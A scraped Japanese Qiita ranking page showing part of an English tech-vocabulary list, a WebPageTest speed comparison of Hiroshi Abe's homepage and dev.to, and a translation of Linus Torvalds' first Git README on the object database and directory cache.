<p><strong>clunky </strong><br>
アプリの動き、スクロールがもっさりとしてることを表現。<br>
ギクシャクした。ぎこちない。昔、自動車の教習所にあった90度に２回折れ曲がる道。</p>

<blockquote>
<p>Hybrid applications are a bit clunky.</p>
</blockquote>

<p><strong>slick </strong><br>
すべすべ。ツルツル。F1のレギュラーのタイヤ。(レインタイヤでなく)</p>

<blockquote>
<p>iOS apps are so slick.</p>
</blockquote>

<p><strong>sleek </strong><br>
艶のある。滑らかな。</p>

<blockquote>
<p>sleek monitor</p>
</blockquote>

<p><strong>snappy </strong><br>
動きが素早い。テキパキ。ビュンビュン。(UIの動き)</p>

<p><strong>tangible</strong><br>
触れることのできる<br>
tangible user interface</p>

<p><strong>iffy</strong><br>
うさんくさい。怪しげな。</p>

<p><strong>lenient </strong><br>
ゆるい。厳しくない。寛大。<br>
シンタックスとかが。(JavaScript)</p>

<blockquote>
<p>反) strict 厳しい<br>
同) easy going</p>
</blockquote>

<p><strong>killer </strong><br>
すごい、驚異的な、決定的な</p>

<blockquote>
<p>killer app (マーケットを揺るがす)決定的なアプリケーション<br>
killer logic 驚異的なロジック<br>
Machine learning could be a killer technology.</p>
</blockquote>

<p><strong>go-to </strong><br>
大黒柱、頼もしい、頼れる</p>

<blockquote>
<p>ReactJS is a go-to library. ReactJSは、頼りになるライブラリ。</p>
</blockquote>

<p><strong>savvy</strong><br>
賢い。よく知っている。情報通。</p>

<blockquote>
<p>tech savvy</p>
</blockquote>

<p><strong>weird, bizarre, quirky, odd</strong><br>
奇妙、謎、おかしい。アプリやシステムの謎な動き、現象、バグをさして。(原因がよくわからない。)</p>

<blockquote>
<p>It's so weird. We have no idea why this happen.</p>
</blockquote>

<p><strong>freaky</strong><br>
気まぐれ。変人。</p>

<blockquote>
<p>The network connections are freaky. We hit freaky JavaScript issues.<br>
注) 性的な意味もあるので注意。</p>
</blockquote>

<p><strong>vague</strong><br>
あやふや。モヤっとしている。</p>

<blockquote>
<p>The requirements are vague. 要件がモヤっとしている。</p>
</blockquote>

<p><strong>meticulous</strong><br>
細かい。細部にこだわる。几帳面。好みにうるさい。</p>

<blockquote>
<p>Japanese customers are so meticulous about requirements. 日本の顧客はとても仕様にうるさい。<br>
類) particular, fussy<br>
The customers make a big fuss about small details. あのお客さんは細かいことに大騒ぎする。</p>
</blockquote>

<h2>
<span id="副詞" class="fragment"></span><a href="#%E5%89%AF%E8%A9%9E"><i class="fa fa-link"></i></a>副詞</h2>

<p><strong>typically</strong><br>
典型的には</p>

<blockquote>
<p>That's typical. ありがちだね。よくある話だよね。</p>
</blockquote>

<p><strong>especially, specifically</strong><br>
特に、とりわけ</p>

<blockquote>
<p>I am very good at writing codes, specifically Swift.</p>
</blockquote>

<p><strong>immediately, instantly</strong><br>
直ちに、即座に</p>

<blockquote>
<p>Async calls return immediately.</p>
</blockquote>

<p><strong>seriously</strong><br>
ほんと。まじで。<br>
reallyよりもよく使用される気がする</p>

<blockquote>
<p>Seriously, I love Swift.　まじでSwiftが好き。</p>
</blockquote>

<p><strong>by far the best</strong><br>
めっちゃ(最高)</p>

<blockquote>
<p>Kotlin is by far the best language.<br>
Kotlin めちゃ最高な言語</p>
</blockquote>

<p><strong>actually, indeed</strong><br>
(そうでなく)実際は。真実は。</p>

<blockquote>
<p>in fact</p>
</blockquote>

<p><strong>presumably, most likely</strong><br>
(状況などから、かなり自信を持って)おそらく</p>

<blockquote>
<p>The root cause of the issue is presumably no free disk space.<br>
その問題の原因は空きディスク容量が無いことだろう。</p>
</blockquote>

<p><strong>basically</strong><br>
基本的には</p>

<blockquote>
<p>acutually, basically はwellのように会話のつなぎであまり意味がないこともある。<br>
また、発音する際、aは発音せず、アクチュリ、ベイシクリ、と聞こえる。</p>
</blockquote>

<p><strong>normally</strong><br>
普通は</p>

<p><strong>similarly</strong><br>
同じように</p>

<p><strong>lastly, finally</strong><br>
最後に、ついに</p>

<blockquote>
<p>First off, next up, lastly 項目を立てて順番に説明するとき、まず最初は、次に、最後に</p>
</blockquote>

<p><strong>eventually, consequently</strong><br>
最終的には。結果的には。<br>
分散システムなどで、今すぐではないが、いずれデータの同期がされること。</p>

<blockquote>
<p>Eventually on-premise systems could be replaced by cloud services.</p>
</blockquote>

<p><strong>optionally</strong><br>
選択的に</p>

<p><strong>generally</strong><br>
一般的に</p>

<blockquote>
<p>類) in general</p>
</blockquote>

<p><strong>automatically / programmatically</strong><br>
自動的、プログラムで(GUIではなく)</p>

<p><strong>automagically</strong><br>
(ダジャレ的)魔法のように自動的に</p>

<p><strong>respectively</strong><br>
各々、それぞれに</p>

<blockquote>
<p>Let's give 12 and 35 to variable A and B, respectively. A=12, B=35</p>
</blockquote>

<p><strong>in lieu of / instead of</strong><br>
〜の代わりに</p>

<p><strong>effortlessly</strong><br>
簡単に。容易に。努力なしに。</p>

<blockquote>
<p>類) easily, readily, with ease</p>
</blockquote>

<p><strong>naively</strong><br>
何も考えず、ただ単純に。プログラミングで、単純、シンプルなアルゴリズム<br>
ナイーブは英語ではネガティブな意味。日本語の繊細を意味するなら、sensitive, innocentを使用する。</p>

<blockquote>
<p>Here is an example of naively implementing the logic.</p>
</blockquote>

<p><strong>hypothetically (speaking)</strong><br>
仮の話として、例えば仮に<br>
アメリカの刑事ドラマでよく使われる。</p>

<blockquote>
<p>Hypothetically, if driverless cars became real , what would you say?</p>
</blockquote>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">15位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>489</kbd>
		<a target="_blank" href="https://qiita.com/naru0504/items/7d652681d698f6d88c4f">dev.toと阿部寛のホームページについてちゃんと計測させてくれ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-17<br />07:51:11</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/58800.html">naru0504</a>(34件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/58800/profile-images/1510157033">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[performance]</b> <b>[frontend]</b> <b>[WebpageTest]</b> <b>[阿部寛]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>Twitter見てたら、以下のツイートを見た。</p>

<p><a href="https://camo.qiitausercontent.com/3ded03f49f93695d7f0e4c2ded0da59a4c6a3098/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f39313833656566612d656264372d323931622d346235392d6335663831396564313031302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/3ded03f49f93695d7f0e4c2ded0da59a4c6a3098/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f39313833656566612d656264372d323931622d346235392d6335663831396564313031302e706e67" alt="Kobito.PWcWWH.png" title="Kobito.PWcWWH.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/58800/9183eefa-ebd7-291b-4b59-c5f819ed1010.png"></a></p>

<p>数時間後、<a href="http://kuxumarin.hatenablog.com/entry/2017/11/15/dev.to%E3%81%A8%E9%98%BF%E9%83%A8%E5%AF%9B%E3%81%AE%E3%83%9B%E3%83%BC%E3%83%A0%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%A9%E3%81%A3%E3%81%A1%E3%81%8C%E9%80%9F%E3%81%84%E3%81%A7%E3%81%99%E3%81%8B%EF%BC%9F" rel="nofollow noopener" target="_blank">dev.toと阿部寛のホームページどっちが速いですか？</a>というブログがTLに現れた。</p>

<p>GoogleのPageSpeed Insightsで測って阿部寛のホームページの方が早かったという結論付けてよいのかという疑問が浮かび、webpagetest.orgで計測することにした。</p>

<h2>
<span id="設定" class="fragment"></span><a href="#%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>設定</h2>

<p><a href="https://camo.qiitausercontent.com/805393d7ff8fd4298454baca97b62e2450eedfa4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f64663062363266322d666330392d373063622d393766632d6266636330343231373066612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/805393d7ff8fd4298454baca97b62e2450eedfa4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f64663062363266322d666330392d373063622d393766632d6266636330343231373066612e706e67" alt="Kobito.Lvk0xl.png" title="Kobito.Lvk0xl.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/58800/df0b62f2-fc09-70cb-97fc-bfcc042170fa.png"></a></p>

<p><a href="https://camo.qiitausercontent.com/5fe945ea40ef0c18de9a0261c20bc8034c4d0cf5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f39386131653465322d313964332d343634642d643639622d3432656335356531626663372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5fe945ea40ef0c18de9a0261c20bc8034c4d0cf5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f39386131653465322d313964332d343634642d643639622d3432656335356531626663372e706e67" alt="Kobito.ORtVPG.png" title="Kobito.ORtVPG.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/58800/98a1e4e2-19d3-464d-d69b-42ec55e1bfc7.png"></a></p>

<p>阿部寛のホームページに関しては、Tokyoリージョンにあるものとする。<br>
そして、dev.toはNY発らしいので、サーバーの設定をNYにして測定する。</p>

<blockquote>
<p>The platform was created in 2016. The twitter account, @ThePraticalWeb <br>
<a href="https://camo.qiitausercontent.com/5b7f5447f3fc99598bcbc0b57c6f6e1c1e0268c5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f36306131623861312d306465382d346366312d306439632d3735336663373633633062322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5b7f5447f3fc99598bcbc0b57c6f6e1c1e0268c5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f36306131623861312d306465382d346366312d306439632d3735336663373633633062322e706e67" alt="Kobito.BpoUJD.png" title="Kobito.BpoUJD.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/58800/60a1b8a1-0de8-4cf1-0d9c-753fc763c0b2.png"></a></p>
</blockquote>

<h2>
<span id="評価結果" class="fragment"></span><a href="#%E8%A9%95%E4%BE%A1%E7%B5%90%E6%9E%9C"><i class="fa fa-link"></i></a>評価結果</h2>

<p><a href="https://www.webpagetest.org/result/171116_B5_6f8f8f7e62acf6c7f7f3e4a086c26c23/" rel="nofollow noopener" target="_blank">Webpagetest - 阿部寛のホームページ</a><br>
<a href="https://www.webpagetest.org/result/171116_B5_6f8f8f7e62acf6c7f7f3e4a086c26c23/" rel="nofollow noopener" target="_blank">Webpagetest - dev.to</a></p>

<h3>
<span id="阿部寛のホームページ" class="fragment"></span><a href="#%E9%98%BF%E9%83%A8%E5%AF%9B%E3%81%AE%E3%83%9B%E3%83%BC%E3%83%A0%E3%83%9A%E3%83%BC%E3%82%B8"><i class="fa fa-link"></i></a>阿部寛のホームページ</h3>

<p><a href="https://camo.qiitausercontent.com/06d36307672835523bccfc6a31c4b728e1fed8b7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f30356163666634392d326266302d613166642d636635642d3266343463656337343536652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/06d36307672835523bccfc6a31c4b728e1fed8b7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f30356163666634392d326266302d613166642d636635642d3266343463656337343536652e706e67" alt="Kobito.8564GP.png" title="Kobito.8564GP.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/58800/05acff49-2bf0-a1fd-cf5d-2f44cec7456e.png"></a></p>

<p>サーバーからのレスポンスの圧縮がされておらず、イメージも圧縮されていない。さらには、キャッシュの利用も圧倒的にダメである。</p>

<h3>
<span id="devto" class="fragment"></span><a href="#devto"><i class="fa fa-link"></i></a>dev.to</h3>

<p><a href="https://camo.qiitausercontent.com/26f629f1055a9389b3258cfa11e414f2bb8324f4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f35356432393735352d373631612d396162362d663031302d3563353765346234326562312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/26f629f1055a9389b3258cfa11e414f2bb8324f4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f35356432393735352d373631612d396162362d663031302d3563353765346234326562312e706e67" alt="Kobito.AijZLm.png" title="Kobito.AijZLm.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/58800/55d29755-761a-9ab6-f010-5c57e4b42eb1.png"></a></p>

<p>これはすごい。キャッシュの利用こそFであるが、画像の圧縮もCまでに伸びているし、CDNの利用も効果的な模様。</p>

<p>見ての通り、パフォーマンスに対しての工夫はdev.toの方がすばらしい評価を受けている。</p>

<h3>
<span id="速度指標比較" class="fragment"></span><a href="#%E9%80%9F%E5%BA%A6%E6%8C%87%E6%A8%99%E6%AF%94%E8%BC%83"><i class="fa fa-link"></i></a>速度指標比較</h3>

<table>
<thead>
<tr>
<th style="text-align: right">指標</th>
<th style="text-align: right">阿部寛のホームページ</th>
<th style="text-align: center">dev.to</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: right">読み込み速度</td>
<td style="text-align: right">0.313秒</td>
<td style="text-align: center">2.717秒</td>
</tr>
<tr>
<td style="text-align: right">ファーストバイト</td>
<td style="text-align: right">0.109秒</td>
<td style="text-align: center">0.291秒</td>
</tr>
<tr>
<td style="text-align: right">レンダー開始</td>
<td style="text-align: right">0.133秒</td>
<td style="text-align: center">0.907秒</td>
</tr>
<tr>
<td style="text-align: right">スピードインデックス</td>
<td style="text-align: right">257</td>
<td style="text-align: center">908</td>
</tr>
</tbody>
</table>

<h3>
<span id="フィルムストライプビューでディテールを見よう" class="fragment"></span><a href="#%E3%83%95%E3%82%A3%E3%83%AB%E3%83%A0%E3%82%B9%E3%83%88%E3%83%A9%E3%82%A4%E3%83%97%E3%83%93%E3%83%A5%E3%83%BC%E3%81%A7%E3%83%87%E3%82%A3%E3%83%86%E3%83%BC%E3%83%AB%E3%82%92%E8%A6%8B%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>フィルムストライプビューでディテールを見よう</h3>

<p><a href="https://camo.qiitausercontent.com/60c10a8b378d1a7afb747b4eb72f4e4f32df9956/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f36313530313635342d393333632d656437322d626232352d3837326263656163643765362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/60c10a8b378d1a7afb747b4eb72f4e4f32df9956/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f36313530313635342d393333632d656437322d626232352d3837326263656163643765362e706e67" alt="Kobito.uOFFf1.png" title="Kobito.uOFFf1.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/58800/61501654-933c-ed72-bb25-872bceacd7e6.png"></a></p>

<p>見よ、0.3秒の速さで頭部が映し出されたと思った刹那、0.4秒ですべて表示完了していることがわかるだろう。</p>

<p><a href="https://camo.qiitausercontent.com/5565e5fb6056eaf1a307f26b84cc3e93e87c59f1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f66386433616162392d363066642d396538342d663035332d3431613930616336326132362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5565e5fb6056eaf1a307f26b84cc3e93e87c59f1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35383830302f66386433616162392d363066642d396538342d663035332d3431613930616336326132362e706e67" alt="Kobito.vlDyhr.png" title="Kobito.vlDyhr.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/58800/f8d3aab9-60fd-9e84-f053-41a90ac62a26.png"></a></p>

<p>対して、dev.toは0.4秒経過どころか、<strong>倍</strong>の0.8秒経過しても、一切なにも表示されていない状況だ。</p>

<h2>
<span id="結論" class="fragment"></span><a href="#%E7%B5%90%E8%AB%96"><i class="fa fa-link"></i></a>結論</h2>

<p>阿部寛のホームページは改善の余地が多くあるにも関わらず、dev.toよりも圧倒的に読み込みが早い。<br>
Web制作の現場の皆さま、Webpagetest使いこなしましょう。</p>

<h2>
<span id="リンク" class="fragment"></span><a href="#%E3%83%AA%E3%83%B3%E3%82%AF"><i class="fa fa-link"></i></a>リンク</h2>

<ul>
<li><a href="http://abehiroshi.la.coocan.jp/" rel="nofollow noopener" target="_blank">阿部寛のホームページ</a></li>
<li><a href="https://dev.to/" rel="nofollow noopener" target="_blank">dev.to</a></li>
<li><a href="https://sites.google.com/a/webpagetest.org/docs/" rel="nofollow noopener" target="_blank">WebpageTest Documentation</a></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">16位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>486</kbd>
		<a target="_blank" href="https://qiita.com/hogemax/items/b09abc522e0ec05da4fe">Linus Torvalds氏によるGitの内部構造の解説</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-03<br />15:40:51</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/202996.html">hogemax</a>(4件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/202996/profile-images/1506575792">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Linux]</b> <b>[Git]</b> <b>[Linus]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="初めに" class="fragment"></span><a href="#%E5%88%9D%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>初めに</h1>

<p>LinusによるGitのinitial commitのREADMEの訳です。</p>

<p><a href="https://github.com/git/git/tree/e83c5163316f89bfbde7d9ab23ca2e25604af290" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/git/git/tree/e83c5163316f89bfbde7d9ab23ca2e25604af290</a></p>

<p>社内のSVNからの移行を促すために資料を整備していたのですが、SVNでやっていたことを移し替えたりコマンドを覚えたりするより内部構造を知ったほうが早いことに気づきました。</p>

<p>それで、gitの内部構造についての解説資料を色々見ていたのですが、データ構造については原作者のこのREADMEに言い尽くされている気がします。のみならず、gitを使うものが抱くべき精神性のようなものが示されており、深い感銘を覚えました（ヒャッハー）。</p>

<p>※個人的なメモ/社内文書程度で書いておいたのですが、結構読んでいただきびっくりで、いろいろと修正・追補しました。<a href="#%E8%A3%9C%E9%81%BA">補遺</a>もご覧ください。</p>

<h1>
<span id="readme-git---馬鹿コンテンツトラッカー" class="fragment"></span><a href="#readme-git---%E9%A6%AC%E9%B9%BF%E3%82%B3%E3%83%B3%E3%83%86%E3%83%B3%E3%83%84%E3%83%88%E3%83%A9%E3%83%83%E3%82%AB%E3%83%BC"><i class="fa fa-link"></i></a>README: ”GIT - 馬鹿コンテンツトラッカー”</h1>

<p>コミットメッセージ：git, 地獄からきたインフォメーションマネージャ</p>

<h2>
<span id="gitの意味" class="fragment"></span><a href="#git%E3%81%AE%E6%84%8F%E5%91%B3"><i class="fa fa-link"></i></a>gitの意味</h2>

<p>"git" は何を意味することも出来る、お前の気分次第だ。</p>

<ul>
<li><p>3文字で、発音可能で、実際のUNIXシステムで共通コマンドとして使われていないものであればなんでも良かったのだ。事実は'get'の発音間違いだ、関係していようがいまいが。</p></li>
<li><p>バカ。情けなくて浅ましい。単純。その他お前のスラング辞典から拾ってきやがれ。</p></li>
<li><p>グローバル・インフォメーション・トラッカー(global information tracker):<br>
お前はいい気分だ、実際にお前の役に立つ。天使達は歌い、光が突如お前の部屋を満たす。</p></li>
<li><p>くそったれ間抜けなトラック満載のクソ(goddamn idiotic truckload of sh*t): <br>
壊れた場合。</p></li>
</ul>

<h2>
<span id="概要" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81"><i class="fa fa-link"></i></a>概要</h2>

<p>これは馬鹿（だけど超速い）ディレクトリ・コンテンツ・マネージャだ。<br>
沢山の事はしないが、効率的にディレクトリの内容を追跡する。</p>

<p>2つのオブジェクト構造がある</p>

<ul>
<li>オブジェクト・データベース(.git/objects/)</li>
<li>カレントディレクトリキャッシュ(.git/index)</li>
</ul>

<h2>
<span id="オブジェクトデータベースsha1によるファイルディレクトリ" class="fragment"></span><a href="#%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9sha1%E3%81%AB%E3%82%88%E3%82%8B%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA"><i class="fa fa-link"></i></a>オブジェクト・データベース（SHA1によるファイル・ディレクトリ）</h2>

<p>オブジェクト・データベースとは文字通りコンテンツによってアドレス指定可能なオブジェクトの集まりだ。全てのオブジェクトはそのコンテンツによって命名される。オブジェクト自体のSHA1ハッシュ値によって近似される。オブジェクトは他のオブジェクトを(SHA1ハッシュ値により）参照することができるので、お前はオブジェクトの階層構造を構築できる。</p>

<p>このデータベースには複数の種類のオブジェクトがある。全てzlibにより圧縮されており、先頭はファイルタイプによるタグとデータに関するサイズ情報で始まる。SHA1ハッシュ値は圧縮後のものであり、元データのものではない。</p>

<p>特にオブジェクトの一貫性はコンテンツもしくはオブジェクトの種類とは独立して常にテスト出来る。全てのオブジェクトは次のようにして確かめられる。</p>

<ul>
<li><p>ハッシュ値がファイルのコンテンツにマッチすること</p></li>
<li><p>オブジェクトが次の形式のバイトストリームとして復号に成功すること<br>
&lt;スペース無しのascii文字によるタグ&gt; + &lt;space&gt;  + &lt;サイズ情報のasciiによる10進文字列&gt; + &lt;\0&gt; + &lt;バイナリオブジェクトデータ&gt;</p></li>
</ul>

<h3>
<span id="blob" class="fragment"></span><a href="#blob"><i class="fa fa-link"></i></a>BLOB</h3>

<p>ブロブオブジェクトはバイナリ・ブロブデータ以外の何をも意味せず、また他への参照も持たない。データの署名や他の検証は持たず、オブジェクトが一貫している限り(SHA1ハッシュ値によりインデックスされているのでデータ自体は正しいとする）他に何の属性も持たない。名前の関連付けも、パーミッションもない。純粋にデータのブロブだ（別の言い方をすると、ファイルの中身だ）。</p>

<h3>
<span id="tree" class="fragment"></span><a href="#tree"><i class="fa fa-link"></i></a>TREE</h3>

<p>次の階層のオブジェクトの種類は、ツリーオブジェクトだ。ツリーオブジェクトはパーミッション・名前・ブロブデータからなるリストで、名前によりソート済みだ。別の言い方をするとツリーオブジェクトの一意性はコンテンツのセットで決定される。だから2つの別々だが同等のツリーは確実に同じオブジェクトを共有する。</p>

<p>もう一度言うが、ツリーオブジェクトはただの純粋なデータ構造だ。履歴を持たず、署名も持たず、正当性の検証も持たない。コンテンツがハッシュ値によって保護されている以外には。それで、ブロブを信頼するのと同じ理屈でツリーオブジェクトを信頼できるが、お前はコンテンツがどこから来たのか知ることは無い。</p>

<h4>
<span id="1" class="fragment"></span><a href="#1"><i class="fa fa-link"></i></a>※1</h4>

<p>ツリーオブジェクトがファイル名+コンテンツでソートされているため、お前は2つのツリーを展開せずともdiffを作り出すことが出来る。共通の部分を無視するだけでお前のdiffの見栄えは良くなるだろう。別の言い方をするとお前は2つのどんなランダムなツリーの比較でも、ツリーのサイズではなく、差分の大きさをnとしてO(n)の計算量で効果的かつ効率よくdiffを表現できるというわけだ。</p>

<h4>
<span id="2" class="fragment"></span><a href="#2"><i class="fa fa-link"></i></a>※2</h4>

<p>ブロブデータの名前は全く独占的にその内容に依存しているため（名前やパーミッションも関係ない）、ブロブの内容が変わらなければお前は細々としたリネームやパーミッションの変化を見る事ができる。しかしながら、データを変えつつリネームというのはもっと賢いdiffが要求されよう。</p>

<h3>
<span id="チェンジセット" class="fragment"></span><a href="#%E3%83%81%E3%82%A7%E3%83%B3%E3%82%B8%E3%82%BB%E3%83%83%E3%83%88"><i class="fa fa-link"></i></a>チェンジセット</h3>

<p>チェンジセットオブジェクトは履歴反映の概念を導入するオブジェクトだ。他のオブジェクトとは対象的に、ツリーの物理的な状態を表現するだけでなく、どうやって、そしてなぜそこにたどり着いたのかを表現する。</p>

<p>チェンジセットはツリーオブジェクトによって定義され、結果として（0,もしくは1以上）の親チェンジセットや何が起こったのかを表記するコメントを含む。もう一度言うが、チェンジセットそれ自体が認証されたりしているわけではない。コンテンツは明確で全てのレベルにおいて強固な暗号署名のゆえに「安全」であるが、しかしながらツリーが「良い」とかマージ情報が意味を成すとか信じる理由などない。例えば親チェンジセットはその結果について何の関連も持つ必要はない。</p>

<h4>
<span id="1-1" class="fragment"></span><a href="#1-1"><i class="fa fa-link"></i></a>※1</h4>

<p>本物のソース・コード管理システム（SCM）とは違い、チェンジセットにはリネーム情報やファイルモードの変更情報は含まれない。そういった事はツリー（結果のツリー、及び結果のツリーの親）が明示的に関わることだ。この馬鹿ファイルマネージャがそれらを表現する意味はない。</p>

<h4>
<span id="2信頼について" class="fragment"></span><a href="#2%E4%BF%A1%E9%A0%BC%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>※2「信頼」について</h4>

<p>「信頼」はgitの全く埒外の概念だが、次の事を覚えておけ。まず第一に、全てのものがSHA1によりハッシュ値を与えられているゆえ、お前はオブジェクトがそのままであり外部の源により弄くられていないことを信頼出来る。オブジェクト名により、知られている状態を一意的に識別出来るのだ - 単にお前が信頼したいであろう状態ではない。</p>

<p>さらに、チェンジセットのSHA1署名はツリーのSHA1署名と、更にその親と関連付けられており、単一の名前のチェンジセットが全コンテンツと共に全履歴のセットを規定する。一度お前がチェンジセットの名前を得たなら、後ほど履歴のステップを誤魔化す事はできない。</p>

<p>それで幾つかのシステムにおける現実的な信頼を紹介するとすれば、お前がしなければならないのはトップレベルのチェンジセット名を含む特別な記述一つをデジタル的に署名することだけだ。お前のデジタル署名は他の者にそのチェンジセットが信頼できることを示し、チェンジセットの履歴の不変性は他の者に全履歴が信頼できることを示すであろう。</p>

<p>言い換えるならば、お前はGPG/PGP等のデジタル署名されたemailを使い（SHA1ハッシュ値の）トップのチェンジセットを送るだけで全てのアーカイブの検証を行うことが出来る。</p>

<p>特に、お前や他の者が信頼するドキュメントの複数のトラスト・ポイントやタグから成る分割されたアーカイブを持つことが出来る。もっともそれら「信頼証明」はgitそのものを使っていることからもたらされるわけだが、別に特段gitがお前に何かするというわけでもない。</p>

<p>別の方法で言うならば、git自体はコンテンツの整合性のみ扱い、信頼は外部から付与されるということである。</p>

<h2>
<span id="カレントディレクトリキャッシュ" class="fragment"></span><a href="#%E3%82%AB%E3%83%AC%E3%83%B3%E3%83%88%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E3%82%AD%E3%83%A3%E3%83%83%E3%82%B7%E3%83%A5"><i class="fa fa-link"></i></a>カレント・ディレクトリ・キャッシュ</h2>

<p>カレントディレクトリキャッシュとは単純なバイナリファイルであり、任意の時点での仮想的なディレクトリのコンテンツを効率よく表現したものである。名前、日付、パーミッション、コンテンツ（またはブロブ）を一緒にセットしたものの単純な配列である。キャッシュはいつでも名前順に並べられているが、キャッシュなので長い期間に渡って保持されることを意図してはおらず、いつでも部分的に更新できる。</p>

<p>特に、カレントディレクトリキャッシュは確実に現在のディレクトリの内容と一致しなければならないと言うわけではないが、2つの重要な属性がある。</p>

<ul>
<li><p>キャッシュしている全ての状態が再生成可能であること<br>
（ディレクトリ構造だけでなく、ブロブオブジェクトを通して全データも再生成可能であるということ）<br>
特殊な場合として、明確で重複しないカレントディレクトリキャッシュからツリーオブジェクトへの単一のマッピングが有り、他のデータを見る必要も無くカレントキャッシュディレクトリから効率よく生成できる場合がある。それでディレクトリキャッシュはいつどの時点でもただひとつのユニークに定義されたツリーオブジェクトである（しかしながらツリーオブジェクトとディレクトリ内で何が起こったかを照合するため追加的データを持つ)</p></li>
<li><p>キャッシュされた状態（裏付けされるのを待っているツリーオブジェクト）と現在の状態との不整合を検出するための効率の良いメソッドを持つ。</p></li>
</ul>

<p>以上がディレクトリキャッシュが行うたった2つのことである。キャッシュであり、既存のツリーオブジェクトからの完全な再生成や、開発ツリーの更新、既存ツリーとの比較を行うためのものである。もしお前がディレクトリキャッシュを全く吹き飛ばしたとしても、キャッシュで表現されているツリーの名前を保持している限り、何のデータも失わない。</p>

